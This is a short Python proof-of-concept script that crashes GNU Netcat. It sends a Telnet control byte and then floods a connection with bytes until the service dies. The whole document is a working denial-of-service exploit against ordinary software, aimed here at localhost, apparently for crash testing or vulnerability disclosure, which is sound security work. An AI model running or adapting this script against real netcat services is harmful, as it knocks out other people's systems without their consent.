import socket

RHOST = "127.0.0.1"
RPORT = 12347

print("[+] Connecting to %s:%d" % (RHOST, RPORT))
s = socket.create_connection((RHOST, RPORT))
s.send(b"\xFF") # Telnet control character
print("[+] Telnet control character sent")
print("[i] Starting")
try:
    i = 0
    while True: # Loop until it crashes
        i += 1
        s.send(b"\x30")
except:
    print("[+] GNU Netcat crashed on iteration: %d" % i)
